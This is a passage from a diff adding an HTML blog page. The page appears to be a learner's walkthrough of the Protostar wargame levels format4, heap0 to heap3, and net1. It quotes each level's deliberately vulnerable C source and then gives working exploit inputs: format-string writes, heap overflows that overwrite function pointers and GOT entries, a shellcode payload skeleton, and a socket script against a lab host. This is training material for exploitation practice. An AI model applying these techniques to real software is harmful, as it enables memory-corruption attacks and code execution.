+  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">512</span>];
+
+  fgets(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), stdin);
+
+  printf(buffer);
+
+  exit(<span style="color:#ae81ff">1</span>);  
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  vuln();
+}
+</code></pre></div><p>hello: 080484b4</p>
+<p>0x8049724 &raquo;&gt; \x24\x97\x04\x08</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;print &#34;\x24\x97\x04\x08\x26\x97\x04\x08%33964d%4$hn%33616d%5$hn&#34; &#39;</span> |./format4
+</code></pre></div><h2 id="heap-0">Heap 0</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> data {
+  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">64</span>];
+};
+
+<span style="color:#66d9ef">struct</span> fp {
+  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>fp)();
+};
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">winner</span>()
+{
+  printf(<span style="color:#e6db74">&#34;level passed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nowinner</span>()
+{
+  printf(<span style="color:#e6db74">&#34;level has not been passed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  <span style="color:#66d9ef">struct</span> data <span style="color:#f92672">*</span>d;
+  <span style="color:#66d9ef">struct</span> fp <span style="color:#f92672">*</span>f;
+
+  d <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> data));
+  f <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> fp));
+  f<span style="color:#f92672">-&gt;</span>fp <span style="color:#f92672">=</span> nowinner;
+
+  printf(<span style="color:#e6db74">&#34;data is at %p, fp is at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, d, f);
+
+  strcpy(d<span style="color:#f92672">-&gt;</span>name, argv[<span style="color:#ae81ff">1</span>]);
+  
+  f<span style="color:#f92672">-&gt;</span>fp();
+
+}
+</code></pre></div><p>long pattern input from gdb
+hit the eip with overwrite the fb() address in the heap <code>kkkk' get winner() address with</code>print winner<code>in gdb or by</code>obidumb -t heap0`
+replace kkkk with winner addres 0x08048464 &raquo; little indian \x64\x84\x04\x08</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./heap0 <span style="color:#e6db74">`</span>python -c <span style="color:#e6db74">&#39;print &#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x64\x84\x04\x08&#34;&#39;</span><span style="color:#e6db74">`</span>
+</code></pre></div><h2 id="heap-1">Heap 1</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> internet {
+  <span style="color:#66d9ef">int</span> priority;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name;
+};
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">winner</span>()
+{
+  printf(<span style="color:#e6db74">&#34;and we have a winner @ %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, time(NULL));
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  <span style="color:#66d9ef">struct</span> internet <span style="color:#f92672">*</span>i1, <span style="color:#f92672">*</span>i2, <span style="color:#f92672">*</span>i3;
+
+  i1 <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> internet));
+  i1<span style="color:#f92672">-&gt;</span>priority <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+  i1<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">8</span>);
+
+  i2 <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> internet));
+  i2<span style="color:#f92672">-&gt;</span>priority <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+  i2<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">8</span>);
+
+  strcpy(i1<span style="color:#f92672">-&gt;</span>name, argv[<span style="color:#ae81ff">1</span>]);
+  strcpy(i2<span style="color:#f92672">-&gt;</span>name, argv[<span style="color:#ae81ff">2</span>]);
+
+  printf(<span style="color:#e6db74">&#34;and that&#39;s a wrap folks!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+</code></pre></div><p>try run without input in gdb we got segmentation fault because strcpy from address source=0x</p>
+<p>pass long arguments <code>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ aaaabbbbccccddddeeeeffff</code></p>
+<p>we somehow overwite the destination address=<strong>FFFF</strong> i2-&gt;name</p>
+<p>now we could replace it with GOTaddress,<code>jmp *GOTaddress</code>from calling puts-&gt;write with printf(). <code>$  disassable &lt;puts@plt&gt;_address</code></p>
+<p>after that we will cotrol eip with value aaaa which we write it insted of GOTaddress</p>
+<p>now we done by replacing <strong>aaaa</strong> with winner address, <code>print winner</code> in gdb or by <code>obidumb -t heap1</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#e6db74">`</span>python -c <span style="color:#e6db74">&#39;print &#34;AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08&#34;+&#34; \x94\x84\x04\x08&#34;&#39;</span><span style="color:#e6db74">`</span>
+</code></pre></div><h2 id="heap-2">Heap 2</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> auth {
+  <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">32</span>];
+  <span style="color:#66d9ef">int</span> auth;
+};
+
+<span style="color:#66d9ef">struct</span> auth <span style="color:#f92672">*</span>auth;
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>service;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  <span style="color:#66d9ef">char</span> line[<span style="color:#ae81ff">128</span>];
+
+  <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
+    printf(<span style="color:#e6db74">&#34;[ auth = %p, service = %p ]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, auth, service);
+
+    <span style="color:#66d9ef">if</span>(fgets(line, <span style="color:#66d9ef">sizeof</span>(line), stdin) <span style="color:#f92672">==</span> NULL) <span style="color:#66d9ef">break</span>;
+    
+    <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;auth &#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      auth <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(auth));
+      memset(auth, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(auth));
+      <span style="color:#66d9ef">if</span>(strlen(line <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">31</span>) {
+        strcpy(auth<span style="color:#f92672">-&gt;</span>name, line <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>);
+      }
+    }
+    <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;reset&#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      free(auth);
+    }
+    <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;service&#34;</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      service <span style="color:#f92672">=</span> strdup(line <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>);
+    }
+    <span style="color:#66d9ef">if</span>(strncmp(line, <span style="color:#e6db74">&#34;login&#34;</span>, <span style="color:#ae81ff">5</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      <span style="color:#66d9ef">if</span>(auth<span style="color:#f92672">-&gt;</span>auth) {
+        printf(<span style="color:#e6db74">&#34;you have logged in already!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+      } <span style="color:#66d9ef">else</span> {
+        printf(<span style="color:#e6db74">&#34;please enter your password</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+      }
+    }
+  }
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/opt/protostar/bin$ ./heap2
+<span style="color:#f92672">[</span> auth <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>, service <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> <span style="color:#f92672">]</span>
+auth aaaa
+<span style="color:#f92672">[</span> auth <span style="color:#f92672">=</span> 0x804c008, service <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> <span style="color:#f92672">]</span>
+login
+please enter your password
+<span style="color:#f92672">[</span> auth <span style="color:#f92672">=</span> 0x804c008, service <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span> <span style="color:#f92672">]</span>
+serviceAAAAAAAAAAAAAAAA       
+<span style="color:#f92672">[</span> auth <span style="color:#f92672">=</span> 0x804c008, service <span style="color:#f92672">=</span> 0x804c018 <span style="color:#f92672">]</span>
+login
+you have logged in already!
+<span style="color:#f92672">[</span> auth <span style="color:#f92672">=</span> 0x804c008, service <span style="color:#f92672">=</span> 0x804c018 <span style="color:#f92672">]</span>
+</code></pre></div><h2 id="heap-3">Heap 3</h2>
+<p><a href="https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13">full explaination</a></p>
+<p><img src="https://miro.medium.com/max/551/1*K7xYXTGesD2qTTuhHeS_fQ.jpeg" alt="negative size"></p>
+<p>i followed as much as i understood</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;AAAA&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span>
+      <span style="color:#ae81ff">14</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;shellcode&#34;</span> <span style="color:#f92672">+</span>(<span style="color:#ae81ff">30</span><span style="color:#f92672">-</span>len(shellcode)<span style="color:#f92672">-</span><span style="color:#ae81ff">14</span>)<span style="color:#f92672">*</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">+</span>
+      struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;I&#39;</span>,<span style="color:#ae81ff">0xfffffffc</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;puts@GOT_addr&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;shellcode_addr&#34;</span>
+</code></pre></div><p>stillllllllllllllllllllllllll didn&rsquo;t get it well :(</p>
+<h2 id="net-1">Net 1</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>()
+{
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;
+  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> wanted;
+
+  wanted <span style="color:#f92672">=</span> random();
+
+  printf(<span style="color:#e6db74">&#34;Please send &#39;%d&#39; as a little endian 32bit int</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, wanted);
+
+  <span style="color:#66d9ef">if</span>(fread(<span style="color:#f92672">&amp;</span>i, <span style="color:#66d9ef">sizeof</span>(i), <span style="color:#ae81ff">1</span>, stdin) <span style="color:#f92672">==</span> NULL) {
+      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;:(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  }
+
+  <span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> wanted) {
+      printf(<span style="color:#e6db74">&#34;Thank you sir/madam</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  } <span style="color:#66d9ef">else</span> {
+      printf(<span style="color:#e6db74">&#34;I&#39;m sorry, you sent %d instead</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
+  }
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">int</span> fd;
+  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>username;
+
+  <span style="color:#75715e">/* Run the process as a daemon */</span>
+  background_process(NAME, UID, GID); 
+  
+  <span style="color:#75715e">/* Wait for socket activity and return */</span>
+  fd <span style="color:#f92672">=</span> serve_forever(PORT);
+
+  <span style="color:#75715e">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+  set_io(fd);
+
+  <span style="color:#75715e">/* Don&#39;t do this :&gt; */</span>
+  srandom(time(NULL));
+
+  run();
+}
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> socket 
+<span style="color:#f92672">import</span> struct            
+    
+s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
+   
+s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;192.168.87.144&#39;</span>, <span style="color:#ae81ff">2999</span>))  
+ 
+s<span style="color:#f92672">.</span>send(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;I&#34;</span>,int((s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>))<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;&#39;&#34;</span>)[<span style="color:#ae81ff">1</span>])))
+
+<span style="color:#66d9ef">print</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+
+s<span style="color:#f92672">.</span>close()     
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
+<script>
+  function goBack() {
+    window.history.back();
+  }
+  </script>
